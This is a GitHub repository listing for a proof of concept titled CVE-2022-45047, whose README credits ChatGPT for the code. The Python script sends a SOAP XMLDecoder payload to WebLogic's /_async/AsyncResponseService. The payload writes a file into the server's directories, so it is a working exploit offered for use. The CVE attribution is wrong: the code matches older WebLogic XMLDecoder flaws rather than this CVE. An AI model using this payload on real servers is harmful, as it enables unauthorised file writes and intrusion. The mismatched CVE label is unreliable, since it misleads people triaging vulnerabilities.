# CVE-2022-45047

POC,EXP,chatGPT for me

| Infos    | Value                                                              |
| -------- | -------------------------------------------------------------------|
| Username | [https://github.com/hktalent](https://github.com/hktalent) |
| Url      | [https://github.com/hktalent/CVE-2022-45047](https://github.com/hktalent/CVE-2022-45047)                                               |
| Stars    | 2                                                          |
| License  | No License                                                        |

<details>

<summary>Topic / Tags</summary>



</details>

## Readme

# CVE-2022-45047
POC,EXP,chatGPT for me

## code
```
import requests

target_url = "http://127.0.0.1:7001"

# CVE-2022-45047
def exploit_weblogic():
    headers = {
        "Content-Type": "text/xml",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0",
        "Accept-Encoding": "gzip, deflate"
    }
    data = '''
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
        <soapenv:Header>
            <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
                <java>
                    <java version="1.8.0_201" class="java.beans.XMLDecoder">
                        <object class="java.io.PrintWriter">
                            <string>servers/AdminServer/tmp/_WL_internal/wls-wsat/4mcj4w/war/test.txt</string>
                            <void method="println">
                                <string>WebLogic CVE-2022-45047 detected!</string>
                            </void>
                            <void method="close" />
                        </object>
                    </java>
                </java>
            </work:WorkContext>
        </soapenv:Header>
        <soapenv:Body/>
        </soapenv:Envelope>
    '''
    try:
        response = requests.post(target_url + "/_async/AsyncResponseService", headers=headers, data=data)
    except Exception as e:
        print("Error: ", e)
        return
    if response.status_code == 202:
        print("WebLogic CVE-2022-45047 detected!")
    else:
        print("WebLogic CVE-2022-45047 not detected.")

if __name__ == '__main__':
    exploit_weblogic()

```



## Get the content

```
git clone https://github.com/hktalent/CVE-2022-45047
cd CVE-2022-45047
```

{% embed url="https://github.com/hktalent/CVE-2022-45047" %}

<figure><img src="https://avatars.githubusercontent.com/u/18223385?v=4" alt=""><figcaption><p>hktalent</p></figcaption></figure>
